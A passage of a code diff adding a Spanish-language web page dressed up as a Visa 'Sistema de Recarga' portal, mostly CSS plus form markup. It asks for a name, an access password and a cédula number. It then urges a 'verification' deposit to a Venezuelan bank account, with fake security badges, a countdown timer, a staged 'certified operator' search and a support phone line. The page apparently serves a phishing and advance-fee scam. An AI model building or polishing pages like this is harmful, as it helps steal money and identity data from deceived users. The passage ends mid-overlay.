+            border-radius: 12px;
+            background-color: var(--light-color);
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            border: 1px solid var(--border-color);
+            transition: var(--transition-medium);
+        }
+        
+        .amount-option:hover {
+            background-color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            border-color: var(--primary-color-light);
+        }
+        
+        .amount-option.selected {
+            background-color: white;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 5px 15px rgba(26, 31, 113, 0.15);
+        }
+        
+        .amount-option .amount-value {
+            font-weight: 600;
+            color: var(--primary-color);
+            font-size: 16px;
+        }
+        
+        .amount-option .amount-bs {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+        
+        .amount-option.selected .amount-value {
+            color: var(--primary-color-dark);
+        }
+        
+        .amount-option.selected .amount-bs {
+            color: var(--secondary-color-dark);
+            font-weight: 500;
+        }
+        
+        .amount-option .radio-circle {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition-fast);
+        }
+        
+        .amount-option:hover .radio-circle {
+            border-color: var(--primary-color-light);
+        }
+        
+        .amount-option.selected .radio-circle {
+            border-color: var(--primary-color);
+        }
+        
+        .amount-option.selected .radio-circle::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background-color: var(--primary-color);
+            border-radius: 50%;
+            animation: radioAppear 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes radioAppear {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+
+        /* Checkbox de confirmación de transferencia */
+        .confirmation-checkbox {
+            display: flex;
+            align-items: flex-start; /* Alineación superior para mejor lectura */
+            gap: 12px;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: rgba(247, 182, 0, 0.1);
+            border-radius: 12px;
+            border: 1px solid var(--secondary-color-light);
+            transition: var(--transition-medium);
+            display: none; /* Inicialmente oculto - CORRECCIÓN */
+        }
+        
+        .confirmation-checkbox.visible {
+            display: flex; /* Se muestra cuando el usuario ha visto los datos de pago - NUEVA PROPIEDAD */
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .confirmation-checkbox:hover {
+            background-color: rgba(247, 182, 0, 0.15);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(247, 182, 0, 0.1);
+        }
+        
+        .custom-checkbox {
+            width: 24px;
+            height: 24px;
+            border-radius: 6px;
+            border: 2px solid var(--secondary-color);
+            position: relative;
+            cursor: pointer;
+            transition: var(--transition-fast);
+            background-color: white;
+            flex-shrink: 0;
+            margin-top: 2px; /* Ajuste fino para alineación vertical */
+        }
+        
+        .custom-checkbox.checked::before {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: var(--primary-color);
+            font-size: 16px;
+            font-weight: bold;
+            animation: checkmarkPop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        
+        @keyframes checkmarkPop {
+            0% { transform: translate(-50%, -50%) scale(0); }
+            50% { transform: translate(-50%, -50%) scale(1.4); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+        
+        .custom-checkbox.checked {
+            background-color: var(--light-color);
+            border-color: var(--primary-color);
+        }
+        
+        .confirmation-text {
+            font-size: 15px;
+            color: var(--text-color);
+            font-weight: 500;
+        }
+        
+        /* Alerta de concepto */
+        .concept-alert {
+            background-color: rgba(26, 31, 113, 0.05);
+            border-left: 4px solid var(--secondary-color);
+            padding: 15px;
+            border-radius: 0 10px 10px 0;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+        
+        .concept-alert i {
+            color: var(--secondary-color);
+            font-size: 20px;
+            margin-top: 2px;
+        }
+        
+        .concept-alert-content {
+            flex: 1;
+        }
+        
+        .concept-alert-title {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 5px;
+            font-size: 15px;
+        }
+        
+        .concept-alert-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        /* Alerta de concepto crítico - NUEVO */
+        .concept-alert.critical {
+            background-color: rgba(255, 152, 0, 0.1);
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .concept-alert.critical i {
+            color: var(--warning-color);
+        }
+        
+        .concept-alert.critical .concept-alert-title {
+            color: var(--warning-color);
+        }
+        
+        /* Estilos del nuevo orbe */
+        .orb-container {
+            position: absolute;
+            top: -150px;
+            right: -150px;
+            width: 300px;
+            height: 300px;
+            z-index: -1;
+            opacity: 0.5;
+            pointer-events: none; /* Asegura que no interfiera con los clics */
+        }
+        
+        .orb {
+            display: grid;
+            grid-template-areas: "stack";
+            inline-size: 100%;
+            aspect-ratio: 1;
+            overflow: hidden;
+            border-radius: 50%;
+        }
+        
+        .orb::before,
+        .orb::after {
+            content: "";
+            display: block;
+            grid-area: stack;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            transform: translateZ(0);
+        }
+        
+        .orb::before {
+            background: conic-gradient(
+                    from calc(var(--angle) * 2) at 25% 70%,
+                    var(--accent-color),
+                    transparent 20% 80%,
+                    var(--accent-color)
+                ),
+                conic-gradient(
+                    from calc(var(--angle) * 2) at 45% 75%,
+                    var(--secondary-color),
+                    transparent 30% 60%,
+                    var(--secondary-color)
+                ),
+                conic-gradient(
+                    from calc(var(--angle) * -3) at 80% 20%,
+                    var(--primary-color),
+                    transparent 40% 60%,
+                    var(--primary-color)
+                ),
+                conic-gradient(
+                    from calc(var(--angle) * 2) at 15% 5%,
+                    var(--secondary-color),
+                    transparent 10% 90%,
+                    var(--secondary-color)
+                ),
+                conic-gradient(
+                    from calc(var(--angle) * 1) at 20% 80%,
+                    var(--primary-color),
+                    transparent 10% 90%,
+                    var(--primary-color)
+                ),
+                conic-gradient(
+                    from calc(var(--angle) * -2) at 85% 10%,
+                    var(--accent-color),
+                    transparent 20% 80%,
+                    var(--accent-color)
+                );
+            box-shadow: inset var(--background-color) 0 0 5vmin 1vmin;
+            filter: blur(3vmin) contrast(5);
+            animation: rotate 20s linear infinite;
+        }
+        
+        .orb::after {
+            --dot: 1.5px;
+            background-image: radial-gradient(
+                circle at center,
+                var(--background-color) var(--dot),
+                transparent var(--dot)
+            );
+            background-size: calc(var(--dot) * 2) calc(var(--dot) * 2);
+            mask-image: radial-gradient(black 25%, transparent 75%);
+            backdrop-filter: blur(8vmin) contrast(10);
+            mix-blend-mode: overlay;
+        }
+        
+        @keyframes rotate {
+            to {
+                --angle: 360deg;
+            }
+        }
+        
+        /* Checkbox de entendimiento del proceso */
+        .understanding-checkbox {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: rgba(0, 85, 200, 0.05); /* Color azul acento */
+            border-radius: 12px;
+            border: 1px solid var(--accent-color-light);
+            transition: var(--transition-medium);
+        }
+        
+        .understanding-checkbox:hover {
+            background-color: rgba(0, 85, 200, 0.1);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 85, 200, 0.1);
+        }
+        
+        .understanding-checkbox .custom-checkbox {
+            border-color: var(--accent-color);
+        }
+        
+        .understanding-checkbox .custom-checkbox.checked {
+            border-color: var(--accent-color);
+        }
+        
+        .understanding-checkbox .custom-checkbox.checked::before {
+            color: var(--accent-color);
+        }
+        
+        /* Etiqueta de información crítica */
+        .critical-info-tag {
+            display: inline-block;
+            background-color: var(--warning-color);
+            color: white;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 4px;
+            vertical-align: middle;
+            margin-left: 8px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        /* Etiqueta para información de importancia */
+        .important-tag {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 2px 8px;
+            border-radius: 4px;
+            vertical-align: middle;
+            margin-left: 8px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        
+        /* Nueva alerta durante el proceso de transferencia */
+        .payment-alert {
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            position: relative;
+            transition: var(--transition-medium);
+        }
+        
+        .payment-alert::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(247, 182, 0, 0.05) 0%, transparent 100%);
+            border-radius: 12px;
+            z-index: -1;
+        }
+        
+        .payment-alert:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.05);
+        }
+        
+        .payment-alert-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .payment-alert-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--warning-color-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        
+        .payment-alert-icon i {
+            font-size: 20px;
+            color: var(--warning-color);
+        }
+        
+        .payment-alert-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+        
+        .payment-alert-body {
+            padding-left: 52px; /* Alineado con el contenido después del ícono */
+        }
+        
+        .payment-alert-message {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        
+        .payment-alert-code {
+            background-color: rgba(247, 182, 0, 0.15);
+            border: 1px dashed var(--warning-color);
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--primary-color-dark);
+            text-align: center;
+            letter-spacing: 1px;
+            position: relative;
+            margin: 10px 0;
+        }
+        
+        .payment-alert-code::before {
+            content: 'Código de concepto:';
+            position: absolute;
+            top: -10px;
+            left: 10px;
+            background-color: white;
+            padding: 0 8px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            font-weight: 400;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        /* Estilos para dispositivos móviles mejorados */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+                margin: 5px auto;
+            }
+            
+            .card {
+                padding: 20px 12px;
+                margin-bottom: 15px;
+                border-radius: 15px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            h2 {
+                font-size: 18px;
+            }
+            
+            p {
+                font-size: 13px;
+                margin-bottom: 15px;
+            }
+            
+            .btn-container {
+                flex-direction: column-reverse;
+                gap: 8px;
+            }
+            
+            .btn {
+                padding: 10px 14px;
+                font-size: 13px;
+                border-radius: 10px;
+            }
+            
+            .step-icon {
+                width: 30px;
+                height: 30px;
+                font-size: 13px;
+            }
+            
+            .step-text {
+                font-size: 11px;
+            }
+            
+            .logo {
+                max-width: 75px;
+            }
+            
+            .logo-container::before {
+                width: 90px;
+                height: 90px;
+            }
+            
+            .steps {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+                margin-left: 5px;
+                margin-bottom: 20px;
+            }
+            
+            .steps::before, .steps::after {
+                display: none;
+            }
+            
+            .step {
+                display: flex;
+                align-items: center;
+                width: 100%;
+                gap: 12px;
+                opacity: 0.6;
+                transition: var(--transition-medium);
+            }
+            
+            .step.active, .step.completed {
+                opacity: 1;
+            }
+            
+            .form-group {
+                margin-bottom: 18px;
+            }
+            
+            label {
+                font-size: 13px;
+                margin-bottom: 6px;
+            }
+            
+            input, select {
+                padding: 10px 12px;
+                font-size: 13px;
+                border-radius: 10px;
+            }
+            
+            .session-timer {
+                top: 8px;
+                right: 8px;
+                padding: 6px 10px;
+                font-size: 12px;
+                border-radius: 8px;
+            }
+            
+            .bank-logos-container {
+                gap: 5px;
+            }
+            
+            .bank-logo {
+                width: 48px;
+                height: 30px;
+                padding: 4px;
+                border-radius: 8px;
+            }
+            
+            .payment-data-card {
+                padding: 20px 12px;
+                width: 95%;
+                margin: 0 8px;
+                border-radius: 16px;
+            }
+            
+            .payment-data-item {
+                padding-bottom: 8px;
+                margin-bottom: 8px;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .payment-data-label {
+                margin-bottom: 6px;
+                font-size: 13px;
+            }
+            
+            .payment-data-content {
+                padding-left: 0;
+                width: 100%;
+                font-size: 13px;
+            }
+            
+            .btn-copy {
+                position: absolute;
+                right: 5px;
+                top: 5px;
+                font-size: 14px;
+            }
+            
+            .data-display-container {
+                width: 100%;
+                padding-left: 0;
+            }
+            
+            .copy-button {
+                margin-top: 8px;
+                padding: 9px 12px;
+                font-size: 12px;
+            }
+            
+            .form-group:hover {
+                transform: none; /* Eliminar animación en móvil */
+            }
+            
+            .visa-security {
+                flex-direction: column;
+                padding: 10px;
+                text-align: center;
+                gap: 8px;
+            }
+            
+            .security-text {
+                text-align: center;
+                font-size: 11px;
+            }
+            
+            .concept-alert {
+                padding: 10px;
+                gap: 8px;
+            }
+            
+            .concept-alert i {
+                font-size: 16px;
+            }
+            
+            .concept-alert-title {
+                font-size: 13px;
+            }
+            
+            .concept-alert-text {
+                font-size: 12px;
+            }
+            
+            /* Corrección para los checkboxes en móvil */
+            .confirmation-checkbox, .understanding-checkbox {
+                padding: 10px;
+                gap: 8px;
+            }
+            
+            .custom-checkbox {
+                min-width: 20px;
+                min-height: 20px;
+            }
+            
+            .confirmation-text {
+                font-size: 12px;
+            }
+            
+            /* Mejorar visibilidad de los pasos en móvil */
+            .step.completed .step-icon::before {
+                font-size: 14px;
+            }
+            
+            /* Ajustar tamaño del orbe para móvil */
+            .orb-container {
+                top: -80px;
+                right: -80px;
+                width: 160px;
+                height: 160px;
+                opacity: 0.25; /* Más sutil en móvil */
+            }
+            
+            /* Ajustes para el overlay y spinner */
+            .processing-text {
+                font-size: 16px;
+            }
+            
+            .checkmark-circle {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 15px;
+            }
+            
+            .checkmark {
+                font-size: 28px;
+            }
+            
+            .success-text {
+                font-size: 18px;
+            }
+            
+            .validation-note {
+                font-size: 13px;
+                max-width: 300px;
+            }
+            
+            .spinner {
+                width: 40px;
+                height: 40px;
+                border-width: 4px;
+                margin-bottom: 20px;
+            }
+            
+            /* Ajustes para elementos de selección de monto */
+            .amount-option {
+                padding: 12px;
+            }
+            
+            .amount-option .amount-value {
+                font-size: 14px;
+            }
+            
+            .amount-option .amount-bs {
+                font-size: 12px;
+            }
+            
+            .amount-option .radio-circle {
+                width: 16px;
+                height: 16px;
+            }
+            
+            .support-link a {
+                font-size: 12px;
+                padding: 8px 12px;
+            }
+            
+            /* Ajustes para mejorar toques en móvil */
+            .btn, .copy-button, .bank-logo {
+                /* Asegurar área de toque suficiente */
+                min-height: 44px;
+                touch-action: manipulation; 
+            }
+            
+            /* Espacio adicional para evitar problemas de scroll */
+            body {
+                padding-bottom: 30px;
+            }
+            
+            /* Alerta de pago en móvil */
+            .payment-alert {
+                padding: 15px;
+            }
+            
+            .payment-alert-header {
+                gap: 8px;
+            }
+            
+            .payment-alert-icon {
+                width: 30px;
+                height: 30px;
+            }
+            
+            .payment-alert-icon i {
+                font-size: 16px;
+            }
+            
+            .payment-alert-title {
+                font-size: 15px;
+            }
+            
+            .payment-alert-body {
+                padding-left: 38px;
+            }
+            
+            .payment-alert-message {
+                font-size: 12px;
+            }
+            
+            .payment-alert-code {
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+        
+        /* Efecto de resplandor para elementos activos */
+        .glow-effect {
+            box-shadow: 0 0 15px rgba(247, 182, 0, 0.5);
+            animation: glow 1.5s infinite alternate;
+        }
+        
+        @keyframes glow {
+            0% { box-shadow: 0 0 15px rgba(247, 182, 0, 0.3); }
+            100% { box-shadow: 0 0 25px rgba(247, 182, 0, 0.7); }
+        }
+        
+        /* Animación de fadeIn */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+  <link rel="stylesheet" href="responsive.css">
+  <script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="c2ba36cb-40b6-496f-b3fa-9a494d1f0d33";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>
+</head>
+<body>
+    <!-- Fondo de onda animado -->
+    <div class="background-wave">
+        <div class="wave-container">
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+        </div>
+    </div>
+
+    <!-- Contador de sesión -->
+    <div class="session-timer" id="session-timer">
+        <i class="fas fa-clock"></i>
+        <span id="countdown">45</span>
+    </div>
+
+    <div class="container">
+        <!-- Elemento orbe decorativo -->
+        <div class="orb-container">
+            <div class="orb"></div>
+        </div>
+        
+        <div class="header">
+            <div class="logo-container">
+             <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo" class="logo">
+            </div>
+            <h1>Sistema de Recarga</h1>
+            <p>Portal seguro para activación de cuentas y transacciones protegidas</p>
+        </div>
+        
+        <div class="steps" data-progress="1" id="progress-steps">
+            <div class="step active" id="step-1">
+                <div class="step-icon"><span>1</span></div>
+                <div class="step-text">Inicio de Sesión</div>
+            </div>
+            <div class="step" id="step-2">
+                <div class="step-icon"><span>2</span></div>
+                <div class="step-text">Datos Personales</div>
+            </div>
+            <div class="step" id="step-3">
+                <div class="step-icon"><span>3</span></div>
+                <div class="step-text">Información de Recarga</div>
+            </div>
+            <div class="step" id="step-4">
+                <div class="step-icon"><span>4</span></div>
+                <div class="step-text">Detalles de Transferencia</div>
+            </div>
+        </div>
+        
+        <!-- Formulario de Inicio de Sesión -->
+        <div class="card active" id="login-form">
+            <h2>Ingreso al Sistema</h2>
+            <p>Ingrese sus datos para continuar con el proceso de activación</p>
+            
+            <!-- Reordenado: nombre primero, luego clave -->
+            <div class="form-group">
+                <label for="user-name">Nombre Completo:</label>
+                <input type="text" id="user-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="name-error"></div>
+            </div>
+            
+            <div class="form-group" id="access-code-group">
+                <label for="access-code">Clave de Acceso:</label>
+                <input type="password" id="access-code" placeholder="Ingrese su clave de acceso">
+                <div class="error-message" id="code-error"></div>
+            </div>
+            
+            <!-- Checkbox para confirmar entendimiento del proceso -->
+            <div class="understanding-checkbox">
+                <div class="custom-checkbox" id="understanding-checkbox" onclick="toggleUnderstandingCheckbox()"></div>
+                <div class="confirmation-text">Entiendo que este es un proceso de verificación de mi cuenta y me comprometo a seguir los pasos correctamente.</div>
+            </div>
+
+            <div class="form-group small-text" id="balance-info">
+                Saldo actual: <span id="current-balance-usd">$0.00</span> (<span id="current-balance-bs">Bs 0,00</span>)<br>
+                Saldo tras primera recarga: <span id="future-balance-usd">$0.00</span> (<span id="future-balance-bs">Bs 0,00</span>)
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn" id="login-btn" onclick="validateLogin()" disabled>
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="concept-alert">
+                <i class="fas fa-info-circle"></i>
+                <div class="concept-alert-content">
+                    <div class="concept-alert-title">Sistema Seguro</div>
+                    <div class="concept-alert-text">Este portal utiliza encriptación avanzada y protección SSL para garantizar la seguridad de sus datos.</div>
+                </div>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Encriptación SSL · Pasarela Protegida</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+        
+        <!-- Formulario de Datos Personales -->
+        <div class="card" id="user-data-form">
+            <h2>Datos Personales</h2>
+            <p>Complete su información personal para continuar con el proceso de activación</p>
+            
+            <div class="form-group">
+                <label for="full-name">Nombre Completo:</label>
+                <input type="text" id="full-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="fullname-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="id-number">Cédula de Identidad:</label>
+                <div class="document-input-group">
+                    <select class="document-type" id="doc-type">
+                        <option value="V">V</option>
+                        <option value="E">E</option>
+                        <option value="J">J</option>
+                    </select>
+                    <input type="text" id="id-number" placeholder="Ingrese su número de identidad" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <div class="error-message" id="id-error"></div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="goBack('user-data-form', 'login-form')">
+                    <i class="fas fa-arrow-left"></i>
+                    Volver
+                </button>
+                <button class="btn" onclick="validateUserData()">
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                   <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+        
+        <!-- Información de Recarga -->
+        <div class="card" id="payment-info">
+            <h2>Información de Recarga</h2>
+            <p>Seleccione el monto de recarga y utilice los datos de transferencia para completar el pago:</p>
+            <p id="min-amount-note" class="min-amount-note"></p>
+            
+            <div class="form-group">
+                <label for="amount-container">Monto de Recarga:</label>
+                <div id="amount-container">
+                    <!-- Las opciones de monto se cargarán dinámicamente -->
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="recharge-purpose">Propósito de la Recarga:</label>
+                <select id="recharge-purpose">
+                    <option value="verification">Recarga en cuenta con fines de verificación de cuenta</option>
+                    <option value="registration">Recarga en cuenta con fines de registrar cuenta</option>
+                </select>
+            </div>
+
+            <div class="operator-search-section">
+                <div class="operator-info">
+                    <h3>Asignación de operador cajero certificado</h3>
+                    <p>Antes de mostrar los datos sensibles del cajero receptor debemos asignarle un operador certificado de la
+red P2P. Esta búsqueda garantiza que su transacción sea acompañada por un agente verificado y disponible para validar su pago.</p>
+                </div>
+                <button class="btn btn-accent" id="search-operator-btn" onclick="startOperatorSearch()">
+                    <i class="fas fa-user-shield"></i>
+                    Buscar operador cajero certificado
+                </button>
+                <div class="operator-status-card" id="operator-status-card" role="status" aria-live="polite">
+                    <div class="operator-status-header">
+                        <span class="operator-status-badge">
+                            <i class="fas fa-shield-check"></i>
+                            Operador certificado asignado
+                        </span>
+                        <div class="operator-status-name" id="operator-status-name">--</div>
+                        <div class="operator-meta">
+                            <span><i class="fas fa-id-card"></i> <span id="operator-status-code">--</span></span>
+                            <span><i class="fas fa-map-marker-alt"></i> <span id="operator-status-location">--</span></span>
+                            <span><i class="fas fa-trophy"></i> <span id="operator-status-experience">--</span></span>
+                            <span><i class="fas fa-sync"></i> <span id="operator-status-operations">--</span></span>
+                        </div>
+                    </div>
+                    <p class="operator-status-message" id="operator-status-message">En cuanto se asigne un operador certificado,
+lo verás aquí junto con los indicadores de seguridad de la red.</p>
+                </div>
+            </div>
+
+            <div class="data-card" onclick="showPaymentData()">
+                <i class="fas fa-credit-card"></i>
+                <h3>Ver Datos para Recarga</h3>
+                <p>Haga clic aquí para ver la información necesaria para realizar la transferencia</p>
+            </div>
+            
+            <!-- Checkbox de confirmación de transferencia - OCULTO INICIALMENTE -->
+            <div class="confirmation-checkbox" id="transfer-confirmation">
+                <div class="custom-checkbox" id="transfer-checkbox" onclick="toggleTransferCheckbox()"></div>
+                <div class="confirmation-text">Confirmo que he realizado la transferencia por el monto seleccionado</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="goBack('payment-info', 'user-data-form')">
+                    <i class="fas fa-arrow-left"></i>
+                    Volver
+                </button>
+                <button class="btn" id="continue-button" onclick="goToTransferDetails()" disabled>
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+
+        <!-- Formulario de Detalles de Transferencia -->
+        <div class="card" id="transfer-details-form">
+            <h2>Detalles de la Transferencia</h2>
+            <p>Complete la información de la transferencia que ha realizado para procesar su recarga</p>
+            
+            <div class="form-group">
+                <label for="transfer-date">Fecha de Transferencia:</label>
+                <input type="date" id="transfer-date" placeholder="Seleccione la fecha">
+                <div class="error-message" id="date-error"></div>
+            </div>
+
+            <div class="form-group">
+                <label for="transfer-amount">Monto Recargado: <span class="badge badge-accent" id="amount-currency">Bs</span></label>
+                <input type="text" id="transfer-amount" disabled>
+                <div class="error-message" id="amount-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label>Banco de Origen:</label>
+                <div class="bank-logos-container" id="bank-logos">
+                    <!-- Logos de bancos se cargarán dinámicamente -->
+                </div>
+                <div class="error-message" id="bank-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="transfer-reference">Número de Referencia:</label>
+                <input type="text" id="transfer-reference" placeholder="Ingrese el número de referencia de la transferencia" inputmode="numeric" pattern="[0-9]*">
+                <div class="error-message" id="reference-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="transfer-notes">Observaciones (opcional):</label>
+                <input type="text" id="transfer-notes" placeholder="Información adicional sobre su transferencia">
+            </div>
+            
+            <!-- No mostramos botón volver en la etapa final -->
+            <div class="btn-container">
+                <button class="btn" onclick="confirmPayment()">
+                    Enviar Comprobante
+                    <i class="fas fa-check"></i>
+                </button>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
+            </div>
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+            <div class="btn-container">
+                <a class="btn btn-secondary" id="to-recharge" href="#">Ir a Recarga</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Overlay de búsqueda y asignación de operador -->
+    <div class="overlay operator-overlay" id="operator-search-overlay">
+        <div class="operator-search-card" id="operator-search-card">
+            <button type="button" class="overlay-close" onclick="closeOperatorOverlay()" aria-label="Cerrar búsqueda">
+                <i class="fas fa-times"></i>
+            </button>
+            <div class="p2p-scanner" aria-hidden="true">
+                <div class="scanner-ring"></div>
+                <div class="scanner-ring delay"></div>
+                <div class="scanner-core"></div>
+                <div class="scanner-line"></div>
+            </div>
+            <h3 id="operator-search-title">Buscando operador certificado...</h3>
+            <p id="operator-search-message">Estamos conectando con la red P2P segura de Visa Remeex para asignarle un cajero certificado disponible.</p>
+            <div class="operator-progress">
+                <div class="operator-progress-fill" id="operator-progress-fill"></div>
+            </div>
+            <ul class="operator-status-list" id="operator-search-steps"></ul>
+            <div class="operator-assigned-details" id="operator-assigned-details">
+                <div class="operator-avatar" id="operator-assigned-initials">--</div>
+                <div class="operator-assigned-info">
+                    <h4 id="operator-assigned-name">Operador certificado</h4>
+                    <p id="operator-assigned-code">ID --</p>
+                    <p id="operator-assigned-location">Ubicación: --</p>
+                    <p id="operator-assigned-experience">Experiencia: --</p>
+                    <div class="operator-assigned-rating">
+                        <i class="fas fa-star"></i>
+                        <span id="operator-assigned-rating">5.0</span>
+                        <span>·</span>
+                        <span id="operator-assigned-operations">0 operaciones exitosas</span>
+                    </div>
+                </div>
+            </div>
+            <div class="operator-cta">
+                <button class="btn" id="operator-confirm-btn" type="button">Conectar con operador certificado</button>
+                <p class="operator-disclaimer">La asignación se realiza mediante canales cifrados y garantiza acompañamiento humano durante la validación del comprobante.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Overlay para mostrar datos de recarga -->
+    <div class="overlay" id="payment-overlay">
+        <div class="payment-data-card">
+            <h2>Información de Transacción</h2>
+            <div class="distortion-layer"></div>
+            
+            <!-- Líneas de interferencia -->
+            <div class="interference-line" style="top: 30%; animation: scan-line 2s linear infinite;"></div>
+            <div class="interference-line" style="top: 80%; animation: scan-line 3s linear infinite 1s;"></div>
+            
+            <!-- Contenedor para el sistema de partículas -->
+            <div class="particles-container">
+                <canvas class="particles" id="particles-canvas"></canvas>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Banco:</div>
+                <div class="payment-data-content" id="secure-bank">(0104) Banco Venezolano de Credito</div>
+                <button class="btn-copy" onclick="copyToClipboard('(0104) Banco Venezolano de Credito', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">RIF:</div>
+                <!-- Contenedor para dato y visualización temporal -->
+                <div class="data-display-container">
+                    <!-- Dato oculto que se mostrará temporalmente -->
